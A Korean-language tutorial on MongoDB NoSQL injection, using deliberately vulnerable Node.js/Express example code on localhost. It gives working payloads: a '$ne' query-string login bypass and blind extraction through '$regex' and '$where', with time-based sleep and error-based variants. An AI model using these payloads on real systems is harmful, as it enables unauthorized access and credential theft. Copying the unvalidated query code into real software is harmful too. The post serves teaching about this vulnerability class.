# 서론

RDBMS의 경우 SQL을 이해하고 있다면, 모든 RDBMS에 대해 공격을 수행할 수 있지만, **NoSQL의 경우 사용하는 DBMS에 따라 요청 방식과 구조가 다르기 때문에 각각의 DBMS(MongoDB, CouchDB, Redis 등)에 대해 이해하고 있어야 한다.**

이번 글에서는 NRDBMS 중 `MongoDB`를 사용하며 발생할 수 있는 NoSQL Injection에 대해 알아보겠다.

# NoSQL Injection

NoSQL Injection도 이전에 배웠던 SQL Injection과 공격 목적 및 방법은 매우 유사하다.

두 공격 모두 **이용자의 입력 값이 동적으로 쿼리에 포함되면서 발생하는 취약점이다.**

MongoDB의 NoSQL Injection 취약점은 주로 이용자의 입력 값에 대한 검증이 불충분할 때 발생한다.

SQL은 저장하는 데이터의 자료형으로 `String`, `Integer`, `Date`, `Double` 등을 사용할 수 있다.

반면에 MongoDB의 경우 이 외에도 `Object`, `Array` 자료형을 추가적으로 사용할 수 있다. [MongoDB 자료형 공식 문서](https://docs.mongodb.com/manual/reference/operator/query/type/)

**오브젝트 타입**의 입력값을 처리할 때에는 **쿼리 연산자**를 사용할 수 있는데, 이를 통해 다양한 행위가 가능하다.

아래 코드는 `NodeJS`의 `Express` 프레임워크로 개발 된 예제 코드이다.

코드를 살펴보면, 이용자의 입력값과 타입을 추력하는데 `req.query`의 타입이 문자열로 지정되어 있지 않기 때문에, 문자열 외의 타입이 입력될 수 있다.

```
const express = require('express');
const app = express();

app.get('/', function(req,res) {
    console.log('data:', req.query.data);
    console.log('type:', typeof req.query.data);
    res.send('hello world');
});

const server = app.listen(3000, function(){
    console.log('app.listen');
});
```

아래는 파라미터인 `data`로 각각의 타입을 입력한 모습이다. 결과를 살펴보면, 일반적인 문자열 이외에 오브젝트 타입을 삽입할 수 있는 것을 확인할 수 있다.

```
http://localhost:3000/?data=1234
data: 1234
type: string

http://localhost:3000/?data[]=1234
data: [ '1234' ]
type: object

http://localhost:3000/?data[]=1234&data[]=5678
data: [ '1234', '5678' ] 
type: object

http://localhost:3000/?data[5678]=1234
data: { '5678': '1234' } 
type: object

http://localhost:3000/?data[5678]=1234&data=0000
data: { '5678': '1234', '0000': true } 
type: object

http://localhost:3000/?data[5678]=1234&data[]=0000
data: { '0': '0000', '5678': '1234' } 
type: object

http://localhost:3000/?data[5678]=1234&data[1111]=0000
data: { '1111': '0000', '5678': '1234' } 
type: object
```

MongoDB는 문자열이 아닌 타입의 값(`Object`)을 입력할 수 있고, 이를 통해 **쿼리 연산자**를 사용할 수 있다고 하였는데, 이를 통해 어떻게 NoSQL Injection 공격이 가능한지 살펴보자.

아래 코드는 `user` 컬렉션에서 이용자가 입력한 `uid`와 `upw`에 해당하는 데이터를 찾아 출력하는 예제 코드이다.\
(참고로 MongoDB에서 `Collection`에 대한 정의(스키마)는 필요 없지만, 데이터(`Document`)가 삽입될 때 필요한 컬렉션의 개념은 존재한다.)

코드를 살펴보면, 이용자의 입력값에 대해 타입을 검증하지 않기 때문에 오브젝트 타입의 값을 입력하여 연산자를 사용할 수 있다.

```
const express = require('express');
const app = express();
const mongoose = require('mongoose');
const db = mongoose.connection;
mongoose.connect('mongodb://localhost:27017/', { useNewUrlParser: true, useUnifiedTopology: true });

app.get('/query', function(req,res) {
    db.collection('user').find({
        'uid': req.query.uid,
        'upw': req.query.upw
    }).toArray(function(err, result) {
        if (err) throw err;
        res.send(result);
  });
});

const server = app.listen(3000, function(){
    console.log('app.listen');
});
```

오브젝트 타입의 값을 입력할 수 있다면 입력 값에 연산자를 사용할 수 있다고 하였다.

이전에 배웠던 `$ne` 연산자는 **not equal**의 약자로, 입력한 데이터와 일치하지 않는 데이터를 반환한다.

따라서 공격자는 계정 정보를 모르더라도, 아래와 같이 존재하지 않는 데이터를 입력하여 `"admin"`을 포함한 모든 계정의 정보를 알아낼 수 있게 된다.

```
http://localhost:3000/query?uid[$ne]=a&upw[$ne]=a
=> [{"_id":"5ebb81732b75911dbcad8a19","uid":"admin","upw":"secretpassword"}]
```

위는 `$ne` 연산자를 사용해, `uid`와 `upw`가 `"a"`가 아닌 데이터를 조회하는 공격 쿼리의 실행 결과이다.

참고로 `uid[$ne]=a` 형식으로 전달하면, `uid`에는 `{ '$ne' : 'a' }`가 저장된다.

# Blind NoSQL Injection

NoSQL Injection에서는 쿼리문을 조작하여 로그인 인증을 우회하는 방법을 알아보았다.

Blind SQL Injection 공격을 통해서는 여기에 더해서 `True/False` 리턴 값을 통해 관리자 계정의 비밀번호와 같은 **데이터베이스의 정보**를 알아낼 수 있다.

MongoDB에서는 `$regex`, `$where` 연산자를 사용하여 Blind NoSQL Injection 공격을 수행할 수 있다.

아래 표는 각 연산자에 대해서 설명한 표이며, [공식 문서](https://docs.mongodb.com/manual/reference/operator/query/)를 통해 더 많은 연산자를 확인할 수 있다.

| Name   | Description                                                |
|--------|------------------------------------------------------------|
| `$expr`  | 쿼리 언어 내에서 **집계 식**을 사용할 수 있습니다.             |
| `$regex` | 지정된 **정규식**과 일치하는 문서를 선택합니다.                |
| `$text`  | 지정된 **텍스트를 검색**합니다.                                |
| `$where` | **JavaScript 표현**식을 만족하는 문서를 선택합니다.             |

## `$regex`

**정규식을 사용하여 식과 일치하는 데이터를 조회한다.** 아래는 `upw`에서 각 문자로 시작하는 데이터를 조회하는 쿼리의 예시이다.

```
> db.user.find({upw: {$regex: "^a"}})
> db.user.find({upw: {$regex: "^b"}})
> db.user.find({upw: {$regex: "^c"}})
...
> db.user.find({upw: {$regex: "^g"}})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
```

## `$where`

`$where` 뒤의 쿼리문이 `True`를 리턴하는 `Document`를 찾는다고 생각하면 된다.

### 1. 표현식

**`Javascript` 표현식을 만족하는 데이터를 조회한다.**

```
> db.user.find({$where:"return 1==1"})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }

> db.user.find({uid:{$where:"return 1==1"}})
error: {
	"$err" : "Can't canonicalize query: BadValue $where cannot be applied to a field",
	"code" : 17287
}
```

코드를 살펴보면, `return 1 == 1`이 항상 `True`를 리턴하기 때문에 모든 문서를 반환한다. 그리고 해당 연산자는 **`field`에서 사용할 수 없는 것을 확인할 수 있다.**

### 2. `substring`

해당 연산자로 `javascript` 표현식을 입력하면, 앞에서 배웠던 Blind SQL Injection에서 `substr`을 사용한 것과 같이 각 자리의 데이터를 알아낼 수 있따.

아래 쿼리는 `upw`의 첫 글자를 비교해 데이터를 알아내는 쿼리이다. 참고로 `substr`은 `1-index` 였지만, `substring`인 `0-index`이다.

```
> db.user.find({$where: "this.upw.substring(0,1)=='a'"})
> db.user.find({$where: "this.upw.substring(0,1)=='b'"})
> db.user.find({$where: "this.upw.substring(0,1)=='c'"})
...
> db.user.find({$where: "this.upw.substring(0,1)=='g'"})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
```

### 3. `Sleep` 함수를 통한 Time based Injection

MongoDB는 `sleep` 함수를 제공한다. 이 함수를 표현식과 함께 사용하면 **지연 시간을 통해 `True/False` 결과를 확인할 수 있다.**

아래 쿼리는 `upw`의 첫 글자를 비교하고, 해당 표현식이 참을 반환할 때 `sleep` 함수를 실행하는 쿼리이다.

```
db.user.find({$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`});
/*
/?uid=guest'&&this.upw.substring(0,1)=='a'&&sleep(5000)&&'1
/?uid=guest'&&this.upw.substring(0,1)=='b'&&sleep(5000)&&'1
/?uid=guest'&&this.upw.substring(0,1)=='c'&&sleep(5000)&&'1
...
/?uid=guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1
=> 시간 지연 발생.
*/
```

위의 코드에서 시간 지연이 발생하는 `/?uid=guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1`가 파라미터로 전달된다고 생각해보자. (`upw`는 파라미터가 존재하지 않기 때문에 `undefined`)

`uid`의 파라미터 값은 `guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1`이다.

따라서, `this.uid == 'guest' && this.upw.substring(0,1) == 'g' && sleep(5000) && '1' && this.upw == ''` 표현식이 `True`가 되게 하는 `Document`가 리턴된다.

그런데 잘보면, `this.upw == ''`는 `True`가 될 수 없기 때문에 해당 표현식은 절대 `True`를 리턴할 수 없다.

하지만 `sleep` 함수의 존재 때문에, `this.uid == 'guest' && this.upw.substring(0,1) == 'g'` 까지가 `True`일 때만, **Short-circuit evaluation**에 의해 `sleep(5000)`이 호출되기 때문에 시간 지연으로 공격이 성공했는지 확인할 수 있다.

참고로, `&&'1`은 쿼리문을 끝내기 위한 코드이며 `db.user.find({$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`});` 쿼리문에서 `upw`가 일치해야 `True`가 리턴되기 때문에 `sleep` 함수를 통해서만 공격이 가능하다.

### 4. Error based Injection

Error based Injection은 에러를 기반으로 데이터를 알아내는 기법으로, Time based Injection과 거의 비슷한 방법으로 찾고자 하는 조건이 참인 경우에 **올바르지 않은 문법이 실행되도록 하여 고의로 에러를 발생시킨다.**

```
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
error: {
	"$err" : "ReferenceError: asdf is not defined near '&&this.upw=='${upw}'' ",
	"code" : 16722
}
// this.upw.substring(0,1)=='g' 값이 참이기 때문에 asdf 코드를 실행하다 에러 발생

> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
// this.upw.substring(0,1)=='a' 값이 거짓이기 때문에 뒤에 코드가 작동하지 않음
```

위의 코드에서 `this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'`이라는 javascript 표현식이 실행되도록 쿼리문이 전달된다고 가정해보자.

그럼, `this.uid=='guest'&&this.upw.substring(0,1)=='g'`까지가 `True`일 때만, **Short-circuit evaluation**에 의해 `asd`라는 잘못된 문법을 가지는 코드가 호출되기 때문에 `error` 발생을 통해 공격이 성공했는지 확인할 수 있다.
